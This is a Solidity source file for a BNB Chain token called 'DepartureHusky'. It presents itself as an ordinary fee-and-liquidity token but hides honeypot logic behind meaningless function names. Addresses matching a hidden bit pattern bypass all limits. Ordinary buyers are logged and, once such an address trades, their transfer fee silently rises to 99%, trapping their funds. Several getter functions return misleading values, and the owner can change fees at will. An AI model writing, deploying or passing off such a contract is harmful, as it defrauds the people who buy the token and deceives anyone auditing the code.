/**
 *Submitted for verification at BscScan.com on 2022-12-09
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Auth {
    address internal owner;
    mapping(address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract DepartureHusky is IBEP20, Auth {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Departure Husky ";
    string constant _symbol = "DepartureHusky";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private txSellMarketingBurn;
    mapping(address => bool) private liquidityReceiverMaxBuy;
    mapping(address => bool) private buyReceiverExemptMaxLimitAutoSwap;
    mapping(address => bool) private buyBotsFeeWallet;
    mapping(address => uint256) private buyMinLimitBurn;
    mapping(uint256 => address) private botsTeamMarketingLaunched;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private sellBurnBuyMinLaunchedReceiverTeam = 0;
    uint256 private burnTradingLaunchedFee = 6;

    //SELL FEES
    uint256 private swapTradingWalletExempt = 0;
    uint256 private exemptTxModeTeam = 6;

    uint256 private feeMarketingLiquidityTeamLimit = burnTradingLaunchedFee + sellBurnBuyMinLaunchedReceiverTeam;
    uint256 private marketingLaunchedMaxBurn = 100;

    address private botsReceiverFeeAuto = (msg.sender); // auto-liq address
    address private sellMaxExemptLiquidity = (0x4f854B99C42127bB6F8845AbfFfFeb4c7Ae4F9e6); // marketing address
    address private feeLiquidityMinSell = DEAD;
    address private isLaunchedReceiverMarketingMode = DEAD;
    address private maxLimitBotsIs = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private receiverLimitMinMode;
    uint256 private walletSwapExemptModeBotsIs;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private autoMinSwapBurnLiquidity;
    uint256 private receiverLiquidityTeamAuto;
    uint256 private isTeamTxBurn;
    uint256 private botsSellReceiverWalletAutoTxMin;
    uint256 private autoTradingSellMode;

    bool private walletIsLiquidityMarketingTxReceiver = true;
    bool private buyBotsFeeWalletMode = true;
    bool private feeModeLiquiditySell = true;
    bool private exemptTradingBuyBurnTx = true;
    bool private teamReceiverBurnLiquidity = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private autoMarketingWalletBuyLiquidityTrading = _totalSupply / 1000; // 0.1%

    
    uint256 private minLimitAutoExempt;
    uint256 private modeSwapTxMarketing;
    uint256 private limitWalletIsTrading;
    uint256 private marketingIsTradingSellBuyLimit;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Auth(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        autoMinSwapBurnLiquidity = true;

        txSellMarketingBurn[msg.sender] = true;
        txSellMarketingBurn[address(this)] = true;

        liquidityReceiverMaxBuy[msg.sender] = true;
        liquidityReceiverMaxBuy[0x0000000000000000000000000000000000000000] = true;
        liquidityReceiverMaxBuy[0x000000000000000000000000000000000000dEaD] = true;
        liquidityReceiverMaxBuy[address(this)] = true;

        buyReceiverExemptMaxLimitAutoSwap[msg.sender] = true;
        buyReceiverExemptMaxLimitAutoSwap[0x0000000000000000000000000000000000000000] = true;
        buyReceiverExemptMaxLimitAutoSwap[0x000000000000000000000000000000000000dEaD] = true;
        buyReceiverExemptMaxLimitAutoSwap[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return botsTeamLimitFeeMode(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return botsTeamLimitFeeMode(sender, recipient, amount);
    }

    function botsTeamLimitFeeMode(address sender, address recipient, uint256 amount) internal returns (bool) {
        bool bLimitTxWalletValue = teamMarketingMaxWalletAutoSellMin(sender) || teamMarketingMaxWalletAutoSellMin(recipient);

        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                isReceiverSwapBurn();
            }
            if (!bLimitTxWalletValue) {
                liquidityTradingAutoReceiverIs(recipient);
            }
        }

        if (inSwap || bLimitTxWalletValue) {return modeBotsMaxSwap(sender, recipient, amount);}

        if (!txSellMarketingBurn[sender] && !txSellMarketingBurn[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }

        require((amount <= _maxTxAmount) || buyReceiverExemptMaxLimitAutoSwap[sender] || buyReceiverExemptMaxLimitAutoSwap[recipient], "Max TX Limit has been triggered");

        if (sellBotsIsLimitAuto()) {burnTxModeMin();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        uint256 amountReceived = modeMinWalletBuy(sender) ? feeTradingWalletBurnBotsLiquidityMin(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function modeBotsMaxSwap(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function modeMinWalletBuy(address sender) internal view returns (bool) {
        return !liquidityReceiverMaxBuy[sender];
    }

    function minFeeModeReceiver(address sender, bool selling) internal returns (uint256) {
        if (selling) {
            feeMarketingLiquidityTeamLimit = exemptTxModeTeam + swapTradingWalletExempt;
            return marketingMinBuyBots(sender, feeMarketingLiquidityTeamLimit);
        }
        if (!selling && sender == uniswapV2Pair) {
            feeMarketingLiquidityTeamLimit = burnTradingLaunchedFee + sellBurnBuyMinLaunchedReceiverTeam;
            return feeMarketingLiquidityTeamLimit;
        }
        return marketingMinBuyBots(sender, feeMarketingLiquidityTeamLimit);
    }

    function feeTradingWalletBurnBotsLiquidityMin(address sender, address receiver, uint256 amount) internal returns (uint256) {

        uint256 feeAmount = amount.mul(minFeeModeReceiver(sender, receiver == uniswapV2Pair)).div(marketingLaunchedMaxBurn);

        if (buyBotsFeeWallet[sender] || buyBotsFeeWallet[receiver]) {
            feeAmount = amount.mul(99).div(marketingLaunchedMaxBurn);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function teamMarketingMaxWalletAutoSellMin(address account) private view returns (bool) {
        return ((uint256(uint160(account)) << 192) >> 238) == firstSetAutoReceiver;
    }

    function marketingMinBuyBots(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lckV = buyMinLimitBurn[sender];
        uint256 lckF = pFee;
        if (lckV > 0 && block.timestamp - lckV > 2) {
            lckF = 99;
        }
        return lckF;
    }

    function liquidityTradingAutoReceiverIs(address addr) private {
        exemptLimitValue = exemptLimitValue + 1;
        botsTeamMarketingLaunched[exemptLimitValue] = addr;
    }

    function isReceiverSwapBurn() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (buyMinLimitBurn[botsTeamMarketingLaunched[i]] == 0) {
                    buyMinLimitBurn[botsTeamMarketingLaunched[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(sellMaxExemptLiquidity).transfer(amountBNB * amountPercentage / 100);
    }

    function sellBotsIsLimitAuto() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    teamReceiverBurnLiquidity &&
    _balances[address(this)] >= autoMarketingWalletBuyLiquidityTrading;
    }

    function burnTxModeMin() internal swapping {
        uint256 amountToLiquify = autoMarketingWalletBuyLiquidityTrading.mul(sellBurnBuyMinLaunchedReceiverTeam).div(feeMarketingLiquidityTeamLimit).div(2);
        uint256 amountToSwap = autoMarketingWalletBuyLiquidityTrading.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = feeMarketingLiquidityTeamLimit.sub(sellBurnBuyMinLaunchedReceiverTeam.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(sellBurnBuyMinLaunchedReceiverTeam).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(burnTradingLaunchedFee).div(totalETHFee);

        payable(sellMaxExemptLiquidity).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                botsReceiverFeeAuto,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getWalletIsLiquidityMarketingTxReceiver() public view returns (bool) {
        return walletIsLiquidityMarketingTxReceiver;
    }
    function setWalletIsLiquidityMarketingTxReceiver(bool a0) public onlyOwner {
        if (walletIsLiquidityMarketingTxReceiver == feeModeLiquiditySell) {
            feeModeLiquiditySell=a0;
        }
        walletIsLiquidityMarketingTxReceiver=a0;
    }

    function getFeeLiquidityMinSell() public view returns (address) {
        if (feeLiquidityMinSell != feeLiquidityMinSell) {
            return feeLiquidityMinSell;
        }
        if (feeLiquidityMinSell == botsReceiverFeeAuto) {
            return botsReceiverFeeAuto;
        }
        if (feeLiquidityMinSell == maxLimitBotsIs) {
            return maxLimitBotsIs;
        }
        return feeLiquidityMinSell;
    }
    function setFeeLiquidityMinSell(address a0) public onlyOwner {
        if (feeLiquidityMinSell == botsReceiverFeeAuto) {
            botsReceiverFeeAuto=a0;
        }
        feeLiquidityMinSell=a0;
    }

    function getBurnTradingLaunchedFee() public view returns (uint256) {
        return burnTradingLaunchedFee;
    }
    function setBurnTradingLaunchedFee(uint256 a0) public onlyOwner {
        burnTradingLaunchedFee=a0;
    }

    function getLiquidityReceiverMaxBuy(address a0) public view returns (bool) {
            return liquidityReceiverMaxBuy[a0];
    }
    function setLiquidityReceiverMaxBuy(address a0,bool a1) public onlyOwner {
        if (a0 != sellMaxExemptLiquidity) {
            walletIsLiquidityMarketingTxReceiver=a1;
        }
        liquidityReceiverMaxBuy[a0]=a1;
    }

    function getSwapTradingWalletExempt() public view returns (uint256) {
        if (swapTradingWalletExempt == autoMarketingWalletBuyLiquidityTrading) {
            return autoMarketingWalletBuyLiquidityTrading;
        }
        if (swapTradingWalletExempt != autoMarketingWalletBuyLiquidityTrading) {
            return autoMarketingWalletBuyLiquidityTrading;
        }
        return swapTradingWalletExempt;
    }
    function setSwapTradingWalletExempt(uint256 a0) public onlyOwner {
        swapTradingWalletExempt=a0;
    }

    function getFeeMarketingLiquidityTeamLimit() public view returns (uint256) {
        if (feeMarketingLiquidityTeamLimit != sellBurnBuyMinLaunchedReceiverTeam) {
            return sellBurnBuyMinLaunchedReceiverTeam;
        }
        return feeMarketingLiquidityTeamLimit;
    }
    function setFeeMarketingLiquidityTeamLimit(uint256 a0) public onlyOwner {
        if (feeMarketingLiquidityTeamLimit != exemptTxModeTeam) {
            exemptTxModeTeam=a0;
        }
        if (feeMarketingLiquidityTeamLimit != sellBurnBuyMinLaunchedReceiverTeam) {
            sellBurnBuyMinLaunchedReceiverTeam=a0;
        }
        if (feeMarketingLiquidityTeamLimit == marketingLaunchedMaxBurn) {
            marketingLaunchedMaxBurn=a0;
        }
        feeMarketingLiquidityTeamLimit=a0;
    }

    function getBuyReceiverExemptMaxLimitAutoSwap(address a0) public view returns (bool) {
        if (a0 != botsReceiverFeeAuto) {
            return feeModeLiquiditySell;
        }
        if (buyReceiverExemptMaxLimitAutoSwap[a0] == liquidityReceiverMaxBuy[a0]) {
            return exemptTradingBuyBurnTx;
        }
            return buyReceiverExemptMaxLimitAutoSwap[a0];
    }
    function setBuyReceiverExemptMaxLimitAutoSwap(address a0,bool a1) public onlyOwner {
        buyReceiverExemptMaxLimitAutoSwap[a0]=a1;
    }

    function getBotsTeamMarketingLaunched(uint256 a0) public view returns (address) {
        if (a0 != feeMarketingLiquidityTeamLimit) {
            return feeLiquidityMinSell;
        }
        if (a0 == swapTradingWalletExempt) {
            return feeLiquidityMinSell;
        }
            return botsTeamMarketingLaunched[a0];
    }
    function setBotsTeamMarketingLaunched(uint256 a0,address a1) public onlyOwner {
        if (a0 == autoMarketingWalletBuyLiquidityTrading) {
            sellMaxExemptLiquidity=a1;
        }
        if (a0 == exemptTxModeTeam) {
            feeLiquidityMinSell=a1;
        }
        botsTeamMarketingLaunched[a0]=a1;
    }

    function getSellMaxExemptLiquidity() public view returns (address) {
        if (sellMaxExemptLiquidity == maxLimitBotsIs) {
            return maxLimitBotsIs;
        }
        if (sellMaxExemptLiquidity != isLaunchedReceiverMarketingMode) {
            return isLaunchedReceiverMarketingMode;
        }
        if (sellMaxExemptLiquidity != botsReceiverFeeAuto) {
            return botsReceiverFeeAuto;
        }
        return sellMaxExemptLiquidity;
    }
    function setSellMaxExemptLiquidity(address a0) public onlyOwner {
        sellMaxExemptLiquidity=a0;
    }

    function getExemptTxModeTeam() public view returns (uint256) {
        if (exemptTxModeTeam == feeMarketingLiquidityTeamLimit) {
            return feeMarketingLiquidityTeamLimit;
        }
        return exemptTxModeTeam;
    }
    function setExemptTxModeTeam(uint256 a0) public onlyOwner {
        if (exemptTxModeTeam != burnTradingLaunchedFee) {
            burnTradingLaunchedFee=a0;
        }
        if (exemptTxModeTeam != feeMarketingLiquidityTeamLimit) {
            feeMarketingLiquidityTeamLimit=a0;
        }
        exemptTxModeTeam=a0;
    }

    function getAutoMarketingWalletBuyLiquidityTrading() public view returns (uint256) {
        if (autoMarketingWalletBuyLiquidityTrading == burnTradingLaunchedFee) {
            return burnTradingLaunchedFee;
        }
        return autoMarketingWalletBuyLiquidityTrading;
    }
    function setAutoMarketingWalletBuyLiquidityTrading(uint256 a0) public onlyOwner {
        if (autoMarketingWalletBuyLiquidityTrading != marketingLaunchedMaxBurn) {
            marketingLaunchedMaxBurn=a0;
        }
        autoMarketingWalletBuyLiquidityTrading=a0;
    }

    function getExemptTradingBuyBurnTx() public view returns (bool) {
        if (exemptTradingBuyBurnTx == teamReceiverBurnLiquidity) {
            return teamReceiverBurnLiquidity;
        }
        if (exemptTradingBuyBurnTx != feeModeLiquiditySell) {
            return feeModeLiquiditySell;
        }
        return exemptTradingBuyBurnTx;
    }
    function setExemptTradingBuyBurnTx(bool a0) public onlyOwner {
        if (exemptTradingBuyBurnTx == buyBotsFeeWalletMode) {
            buyBotsFeeWalletMode=a0;
        }
        if (exemptTradingBuyBurnTx != feeModeLiquiditySell) {
            feeModeLiquiditySell=a0;
        }
        if (exemptTradingBuyBurnTx != buyBotsFeeWalletMode) {
            buyBotsFeeWalletMode=a0;
        }
        exemptTradingBuyBurnTx=a0;
    }

    function getTeamReceiverBurnLiquidity() public view returns (bool) {
        if (teamReceiverBurnLiquidity != exemptTradingBuyBurnTx) {
            return exemptTradingBuyBurnTx;
        }
        return teamReceiverBurnLiquidity;
    }
    function setTeamReceiverBurnLiquidity(bool a0) public onlyOwner {
        if (teamReceiverBurnLiquidity == walletIsLiquidityMarketingTxReceiver) {
            walletIsLiquidityMarketingTxReceiver=a0;
        }
        teamReceiverBurnLiquidity=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}